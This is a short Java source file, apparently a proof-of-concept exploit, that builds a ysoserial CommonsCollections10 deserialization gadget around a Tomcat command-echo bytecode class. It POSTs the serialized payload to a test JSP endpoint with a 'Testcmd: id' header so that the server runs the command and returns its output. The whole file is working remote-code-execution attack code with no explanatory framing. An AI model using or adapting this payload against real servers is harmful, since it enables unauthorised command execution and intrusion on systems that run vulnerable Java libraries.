package tomcat;

import myframework.HttpRequest;
import myframework.ReadWrite;
import myframework.ser.ClassFiles;
import myframework.ser.Serializer;
import ysoserial.payloads.CommonsCollections10;
import ysoserial.payloads.Eval;


public class Xray {
    public static void main(String[] args) throws Exception{
        String url = "http://wsl.com:8080/tomcattest/shell.jsp";
        Object evil = poc();
        byte[] ser = Serializer.serialize(evil);

        byte[] resp = new HttpRequest(url).addHeader("Testcmd","id").addPostData(ser).send();
        System.out.println(new String(resp));
    }
    public static Object poc() throws Exception{
        byte[] bytes = ReadWrite.readResource(Xray.class,"Tomcat\\code\\根据网上流传的xary payload提取的tomcat回显字节码文件.class");
        Class c = ClassFiles.bytesAsClass(bytes);
        Object o = new Eval().getObject(CommonsCollections10.class,c);
        return o;
    }
}
